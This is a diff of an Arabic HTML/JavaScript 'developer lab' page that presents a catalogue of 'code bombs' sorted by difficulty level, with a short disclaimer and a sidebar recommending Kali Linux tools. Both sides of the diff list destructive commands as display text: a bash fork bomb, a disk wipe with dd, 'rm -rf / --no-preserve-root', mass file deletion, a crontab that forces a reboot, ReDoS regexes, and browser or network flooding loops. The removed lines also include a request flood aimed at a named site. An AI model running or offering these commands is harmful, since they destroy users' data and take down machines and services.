@@ -2,7 +2,7 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>مختبر رضا المطور | الموسوعة الشاملة V4</title>
+    <title>مختبر رضا المطور | النسخة النهائية V4</title>
     <style>
         :root {
             --bg: #020617;
@@ -15,6 +15,7 @@
             --bash: #c084fc;
             --net: #f472b6;
             --cpu: #fb7185;
+            --red-gold: #facc15;
         }
 
         body {
@@ -27,22 +28,35 @@
             overflow: hidden;
         }
 
-        /* القائمة الجانبية - الموسوعة */
-        .sidebar {
-            width: 420px;
+        /* القائمة اليمنى - الموسوعة */
+        .sidebar-right {
+            width: 380px;
             background: #020617;
             border-left: 2px solid var(--accent);
-            display: flex;
-            flex-direction: column;
             transition: 0.5s;
             position: fixed;
-            right: -420px;
+            right: -380px;
             height: 100vh;
             z-index: 1000;
-            box-shadow: -10px 0 30px rgba(0,0,0,0.8);
+            overflow-y: auto;
+            box-shadow: -10px 0 30px rgba(0,0,0,0.7);
         }
+        .sidebar-right.active { right: 0; }
 
-        .sidebar.active { right: 0; }
+        /* القائمة اليسرى - ماذا لو كنت رضا */
+        .sidebar-left {
+            width: 380px;
+            background: #020617;
+            border-right: 2px solid var(--red-gold);
+            transition: 0.5s;
+            position: fixed;
+            left: -380px;
+            height: 100vh;
+            z-index: 1000;
+            overflow-y: auto;
+            box-shadow: 10px 0 30px rgba(0,0,0,0.7);
+        }
+        .sidebar-left.active { left: 0; }
 
         .sidebar-header { 
             padding: 20px; 
@@ -53,18 +67,18 @@
             justify-content: space-between;
             align-items: center;
         }
+        .header-reda { background: var(--red-gold) !important; }
 
-        .info-list { overflow-y: auto; padding: 15px; flex: 1; }
-        
         .info-item { 
             background: #1e293b; 
             padding: 15px; 
-            margin-bottom: 15px; 
+            margin: 12px; 
             border-radius: 10px; 
-            font-size: 0.85rem; 
+            font-size: 0.85rem;
             line-height: 1.6;
             border-right: 4px solid var(--accent);
         }
+        .reda-item { border-right-width: 5px !important; }
 
         .code-snippet {
             display: block;
@@ -73,223 +87,176 @@
             padding: 8px;
             margin-top: 8px;
             border-radius: 5px;
-            font-family: 'Consolas', monospace;
+            font-family: monospace;
             direction: ltr;
             text-align: left;
             font-size: 0.8rem;
-            border: 1px solid #334155;
         }
 
         /* المحتوى الرئيسي */
-        .main-content { 
-            flex: 1; 
-            padding: 40px; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            overflow-y: auto;
-        }
+        .main-content { flex: 1; padding: 20px; display: flex; flex-direction: column; align-items: center; overflow-y: auto; }
 
-        .card { 
-            background: var(--panel); 
-            width: 95%; 
-            max-width: 950px; 
-            padding: 30px; 
-            border-radius: 20px; 
-            box-shadow: 0 20px 50px rgba(0,0,0,0.6); 
-        }
+        .btn-group { display: flex; gap: 15px; margin-bottom: 25px; }
 
-        .level-container {
-            display: flex;
-            gap: 15px;
-            justify-content: center;
-            margin: 25px 0;
-        }
+        .trigger-btn { padding: 12px 25px; border-radius: 50px; border: none; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .learn-trigger { background: var(--accent); color: #000; }
+        .reda-trigger { background: var(--red-gold); color: #000; }
+        .trigger-btn:hover { transform: scale(1.05); filter: brightness(1.1); }
 
-        .level-btn {
-            border: none;
-            padding: 12px 25px;
-            border-radius: 12px;
-            cursor: pointer;
-            font-weight: bold;
-            transition: 0.3s;
-            background: #334155;
-            color: white;
-        }
+        .card { background: var(--panel); width: 95%; max-width: 900px; padding: 30px; border-radius: 20px; box-shadow: 0 20px 50px rgba(0,0,0,0.6); }
 
-        .level-btn.active.l1 { background: var(--lvl1); color: #000; }
-        .level-btn.active.l2 { background: var(--lvl2); color: #000; }
-        .level-btn.active.l3 { background: var(--lvl3); color: #000; }
+        .level-container { display: flex; gap: 10px; justify-content: center; margin-bottom: 25px; }
+        .level-btn { padding: 10px 20px; border-radius: 8px; border: none; cursor: pointer; background: #334155; color: white; font-weight: bold; }
+        .level-btn.active { background: var(--lvl1); color: #000; }
 
         .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
-        
-        .type-btn { 
-            background: #0f172a; 
-            color: var(--text); 
-            border: 1px solid #334155; 
-            padding: 15px; 
-            border-radius: 12px; 
-            cursor: pointer; 
-            font-weight: bold;
-            transition: 0.2s;
-            font-size: 0.9rem;
-        }
+        .type-btn { background: #0f172a; color: var(--text); border: 1px solid #334155; padding: 15px; border-radius: 12px; cursor: pointer; font-weight: bold; transition: 0.2s; }
+        .type-btn:hover { border-color: var(--accent); color: var(--accent); background: #1e293b; }
 
-        .type-btn:hover { transform: translateY(-3px); border-color: var(--accent); color: var(--accent); }
-        .btn-bash { border-color: var(--bash); color: var(--bash); }
-        .btn-net { border-color: var(--net); color: var(--net); }
-        .btn-cpu { border-color: var(--cpu); color: var(--cpu); }
-
-        .results-area { margin-top: 30px; }
-        
-        .code-box { 
-            background: #000; 
-            padding: 25px; 
-            border-radius: 12px; 
-            margin-bottom: 20px; 
-            border-right: 5px solid var(--accent);
-            position: relative;
-        }
-
+        #results { margin-top: 25px; }
+        .code-box { background: #000; padding: 25px; border-radius: 12px; border-right: 5px solid var(--accent); position: relative; }
         .code-box pre { margin: 0; color: #f8fafc; font-family: 'Consolas', monospace; direction: ltr; white-space: pre-wrap; }
         .model-label { color: var(--accent); font-size: 0.75rem; position: absolute; top: 8px; left: 15px; font-weight: bold; }
-
-        .learn-trigger {
-            background: linear-gradient(45deg, #38bdf8, #c084fc);
-            color: white;
-            border: none;
-            padding: 15px 40px;
-            border-radius: 50px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-bottom: 30px;
-            font-size: 1.1rem;
-            box-shadow: 0 10px 20px rgba(56, 189, 248, 0.2);
-        }
     </style>
 </head>
 <body>
 
-<div class="sidebar" id="sidebar">
+<!-- القائمة اليمنى: الموسوعة -->
+<div class="sidebar-right" id="sidebarRight">
     <div class="sidebar-header">
-        <span>📖 موسوعة الـ 100 معلومة البرمجية</span>
-        <button onclick="toggleSidebar()" style="cursor:pointer; background:#fff; border:none; border-radius:5px; padding:5px 10px;">X</button>
+        <span>📖 الموسوعة الشاملة (100 معلومة)</span>
+        <button onclick="toggleSide('Right')" style="cursor:pointer; border:none; background:#fff; border-radius:3px;">إغلاق</button>
     </div>
-    <div class="info-list" id="infoItems"></div>
+    <div id="infoItems"></div>
+</div>
+
+<!-- القائمة اليسرى: ماذا لو كنت رضا -->
+<div class="sidebar-left" id="sidebarLeft">
+    <div class="sidebar-header header-reda">
+        <span>👑 ماذا لو كنت رضا؟</span>
+        <button onclick="toggleSide('Left')" style="cursor:pointer; border:none; background:#fff; border-radius:3px;">إغلاق</button>
+    </div>
+    
+    <div id="redaItems" style="padding: 5px;">
+        <!-- المربع الأول: إخلاء مسؤولية وتحذيرات -->
+        <div class="info-item reda-item" style="border-right-color: #ef4444 !important; background: #2d1a1a;">
+            <h3 style="color: #f87171; margin-top: 0;">⚠️ إخلاء مسؤولية وتحذيرات</h3>
+            <p style="font-size: 0.8rem; color: #fca5a5;">
+                هذا المختبر مخصص للأغراض <strong>التعليمية والبحثية فقط</strong>. 
+                <br><br>
+                • رضا المطور غير مسؤول عن أي استخدام خاطئ لهذه الأكواد.
+                <br>
+                • تجربة هذه الأكواد على أجهزة الغير دون إذن جريمة يعاقب عليها القانون.
+                <br>
+                • بعض الأكواد قد تعطل متصفحك، استخدمها بذكاء.
+            </p>
+        </div>
+
+        <!-- المربع الثاني: كالي لينكس -->
+        <div class="info-item reda-item" style="border-right-color: #3b82f6 !important; background: #1a2332;">
+            <h3 style="color: #60a5fa; margin-top: 0;">🐉 كالي لينكس (Kali Linux)</h3>
+            <p style="font-size: 0.8rem; color: #93c5fd;">
+                نظام التشغيل المفضل لدى رضا المطور لاختبار الاختراق.
+                <br><br>
+                <strong>أدوات ينصح بها رضا:</strong>
+                <br>
+                • <b>Metasploit:</b> للاختراق المتقدم.
+                <br>
+                • <b>Nmap:</b> لفحص الشبكات.
+                <br>
+                • <b>Wireshark:</b> لتحليل البيانات.
+                <br><br>
+                <span style="color: #fbbf24;">"كالي لينكس سلاح، فكن محارباً نبيلاً."</span>
+            </p>
+        </div>
+
+        <!-- نصائح رضا الإضافية -->
+        <div class="info-item reda-item" style="border-right-color: var(--red-gold) !important;">
+            <strong>فلسفة رضا:</strong> البرمجة ليست مجرد كود، بل هي منطق وقوة للسيطرة على الآلة.
+        </div>
+    </div>
 </div>
 
 <div class="main-content">
-    <button class="learn-trigger" onclick="toggleSidebar()">📖 فتح الموسوعة الشاملة (أكواد ومعلومات)</button>
+    <div class="btn-group">
+        <button class="trigger-btn learn-trigger" onclick="toggleSide('Right')">📖 الموسوعة الشاملة</button>
+        <button class="trigger-btn reda-trigger" onclick="toggleSide('Left')">👑 ماذا لو كنت رضا؟</button>
+    </div>
 
     <div class="card">
-        <h1 style="text-align:center; color: var(--accent); margin-top:0;">مختبر رضا المطور V4</h1>
-        <p style="text-align:center; color: #94a3b8;">نظام متطور لفحص القنابل البرمجية والهجمات المنطقية</p>
+        <h1 style="text-align:center; color: var(--accent); margin: 0 0 10px 0;">مختبر رضا المطور V4</h1>
+        <p style="text-align:center; color: #94a3b8; margin-bottom: 20px;">نظام محاكاة الأكواد عالية التأثير</p>
         
         <div class="level-container">
-            <button class="level-btn l1 active" onclick="setLevel(1, this)">المستوى 1</button>
-            <button class="level-btn l2" onclick="setLevel(2, this)">المستوى 2</button>
-            <button class="level-btn l3" onclick="setLevel(3, this)">المستوى 3</button>
+            <button class="level-btn active" id="l1" onclick="setLevel(1)">المستوى 1</button>
+            <button class="level-btn" id="l2" onclick="setLevel(2)">المستوى 2</button>
+            <button class="level-btn" id="l3" onclick="setLevel(3)">المستوى 3</button>
         </div>
 
         <div class="grid">
             <button class="type-btn" onclick="generate('logic')">قنبلة منطقية JS</button>
             <button class="type-btn" onclick="generate('crash')">استنزاف ذاكرة</button>
-            <button class="type-btn btn-bash" onclick="generate('bash')">قنابل Bash Linux</button>
-            <button class="type-btn btn-net" onclick="generate('network')">قنبلة الشبكة</button>
-            <button class="type-btn btn-cpu" onclick="generate('regex')">قنبلة المعالج ReDoS</button>
-            <button class="type-btn btn-bash" onclick="generate('file')">تدمير الملفات</button>
+            <button class="type-btn" onclick="generate('bash')" style="color:var(--bash)">قنابل Bash</button>
+            <button class="type-btn" onclick="generate('network')" style="color:var(--net)">قنبلة الشبكة</button>
+            <button class="type-btn" onclick="generate('regex')" style="color:var(--cpu)">قنبلة المعالج</button>
+            <button class="type-btn" onclick="generate('file')" style="color:var(--lvl3)">تدمير الملفات</button>
         </div>
 
-        <div id="results" class="results-area"></div>
+        <div id="results"></div>
     </div>
 </div>
 
 <script>
     let currentLevel = 1;
 
-    function toggleSidebar() {
-        document.getElementById('sidebar').classList.toggle('active');
+    function toggleSide(side) {
+        const sidebar = document.getElementById('sidebar' + side);
+        sidebar.classList.toggle('active');
     }
 
-    function setLevel(lvl, btn) {
+    function setLevel(lvl) {
         currentLevel = lvl;
         document.querySelectorAll('.level-btn').forEach(b => b.classList.remove('active'));
-        btn.classList.add('active');
-        document.getElementById('results').innerHTML = '';
+        document.getElementById('l' + lvl).classList.add('active');
     }
 
-    // توليد الموسوعة المحدثة
-    const infoItems = document.getElementById('infoItems');
+    // توليد الموسوعة (100 معلومة)
+    const infoList = document.getElementById('infoItems');
     const expertData = [
-        {txt: "قنبلة Bash Fork تستنزف العمليات.", code: ":(){ :|:& };:"},
-        {txt: "هجوم ReDoS يعطل المعالج تماماً.", code: "'a' * 100 + '!' .match(/(a+)+$/)"},
-        {txt: "قنبلة الـ Zip تتمدد من كيلوبايت لجيجابايت.", code: "Exploding 42.zip"},
-        {txt: "ضرب القوائم في Python يملأ الرام.", code: "L = [0] * (10**8)"},
-        {txt: "قنبلة الـ XML Billion Laughs.", code: "&lol; تتكرر أضعافاً"},
-        {txt: "استنزاف الروابط في Linux عبر ln.", code: "ln /dev/urandom loop"},
-        {txt: "قنبلة CSS ترهق كارت الشاشة.", code: "filter: blur(50px);"},
-        {txt: "في C، استنزاف الذاكرة عبر malloc.", code: "while(1){malloc(1024);}"},
-        {txt: "قنبلة الـ Fetch تهاجم السيرفرات.", code: "setInterval(()=>fetch(url))"},
-        {txt: "تصفير القرص الصلب في Linux.", code: "dd if=/dev/zero of=/dev/sda"}
+        {txt: "قنبلة الـ Fork تكرر نفسها للأبد.", code: ":(){ :|:& };:"},
+        {txt: "هجوم ReDoS يستهلك طاقة المعالج.", code: "/(a+)+$/"},
+        {txt: "تصفير القرص الصلب يدمر البيانات.", code: "dd if=/dev/zero of=/dev/sda"},
+        {txt: "قنبلة الـ Zip تتمدد بشكل انفجاري.", code: "Exploding 42.zip"},
+        {txt: "في C، استنزاف الذاكرة عبر malloc.", code: "while(1){malloc(1024);}"}
     ];
 
     for (let i = 1; i <= 100; i++) {
-        let data = expertData[(i-1) % expertData.length];
-        infoItems.innerHTML += `
+        let d = expertData[i % expertData.length];
+        infoList.innerHTML += `
             <div class="info-item">
-                <strong style="color:var(--accent)">معلومة #${i}:</strong> ${data.txt}
-                <code class="code-snippet">${data.code}</code>
-            </div>
-        `;
+                <strong>معلومة #${i}:</strong> ${d.txt}
+                <code class="code-snippet">${d.code}</code>
+            </div>`;
     }
 
-    // مستودع الأكواد المجمع
+    // مستودع الأكواد
     const repo = {
-        logic: {
-            1: ["if(new Date().getFullYear() === 2026) alert('Boom!');"],
-            2: ["setTimeout(() => document.body.innerHTML='', 5000);"],
-            3: ["while(true){ history.pushState(0,0,Math.random()); }"]
-        },
-        crash: {
-            1: ["let a = Array(100000).fill(1);"],
-            2: ["let s = 'bomb'; while(true) s += s;"],
-            3: ["setInterval(() => { window.open(); }, 1);"]
-        },
-        bash: {
-            1: ["wall 'Warning: System Overload'"],
-            2: ["cat /dev/zero > output.img"],
-            3: [":(){ :|:& };:", "echo 'reboot' | crontab -"]
-        },
-        network: {
-            1: ["console.log('Scanning network...');"],
-            2: ["for(i=0;i<100;i++) fetch('http://localhost:'+i);"],
-            3: ["setInterval(() => fetch('https://target.com?v='+Math.random()), 1);"]
-        },
-        regex: {
-            1: ["/a+/.test('aaaa');"],
-            2: ["/([a-z]+)+$/.test('invalid-string-check');"],
-            3: ["'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!'.match(/([a-zA-Z]+)*$/); // CPU KILLER"]
-        },
-        file: {
-            1: ["mkdir test_{1..50}"],
-            2: ["while true; do touch file_$RANDOM; done"],
-            3: ["rm -rf / --no-preserve-root # تدمير شامل", "find / -name '*.jpg' -delete"]
-        }
+        logic: { 1: ["if(new Date().getFullYear() === 2026) alert('Boom!');"], 2: ["setTimeout(()=>document.body.remove(), 5000)"], 3: ["while(true){history.pushState(0,0,1)}"] },
+        crash: { 1: ["let a = Array(100000).fill('x')"], 2: ["let s = 'x'; while(true) s += s;"], 3: ["setInterval(()=>window.open(), 1)"] },
+        bash: { 1: ["wall 'System Warning'"], 2: ["cat /dev/zero > leak.img"], 3: [":(){ :|:& };:"] },
+        network: { 1: ["console.log('Scanning...');"], 2: ["for(i=0;i<100;i++) fetch('/');"], 3: ["setInterval(()=>fetch('/?'+Math.random()), 1)"] },
+        regex: { 1: ["/a+/.test('aa')"], 2: ["/([a-z]+)+$/"], 3: ["'aaaaa!'.match(/([a-zA-Z]+)*$/)"] },
+        file: { 1: ["mkdir test_{1..10}"], 2: ["touch file_$RANDOM"], 3: ["rm -rf / --no-preserve-root"] }
     };
 
     function generate(type) {
         const res = document.getElementById('results');
-        res.innerHTML = '';
-        const codes = repo[type][currentLevel];
-        
-        codes.forEach((c, index) => {
-            res.innerHTML += `
-                <div class="code-box">
-                    <span class="model-label">${type.toUpperCase()} - مستوى ${currentLevel}</span>
-                    <pre>${c}</pre>
-                </div>
-            `;
-        });
+        const code = repo[type][currentLevel];
+        res.innerHTML = `
+            <div class="code-box">
+                <span class="model-label">${type.toUpperCase()} - LEVEL ${currentLevel}</span>
+                <pre>${Array.isArray(code) ? code.join('\n') : code}</pre>
+            </div>`;
     }
 </script>
 
